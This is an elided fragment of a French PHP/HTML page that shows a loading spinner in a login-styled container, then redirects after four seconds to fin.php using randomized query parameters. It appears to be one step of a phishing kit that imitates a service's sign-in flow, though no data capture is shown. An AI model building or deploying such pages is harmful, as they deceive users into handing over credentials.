...
<html lang="fr" style="overflow: auto;">
    <head>
		...
		<meta http-equiv="refresh" content="4;url=./fin.php?p=<?php echo $random1; ?>&<?php echo $random4; ?>=<?php echo $random3; ?>s<?php echo $random1; ?>&<?php echo $random4; ?>=<?php echo $random3; ?>m<?php echo $random1; ?>&<?php echo $random4; ?>=<?php echo $random3; ?>" >
                        ...
                        <div class="auth auth--withRetour js-document">
                            ...
                            <section>
                                <main class="auth__content">
                                    <h3 style="margin-bottom: 20px;" class="auth__content-title"><img src="../assets/images/enc2.png" /></h3>
                                    <center>
										<h2><img src="../assets/images/load.gif" style="margin-top: 80px; margin-bottom: 80px;"/></h2>
										</center>
                                </main>
                            </section>
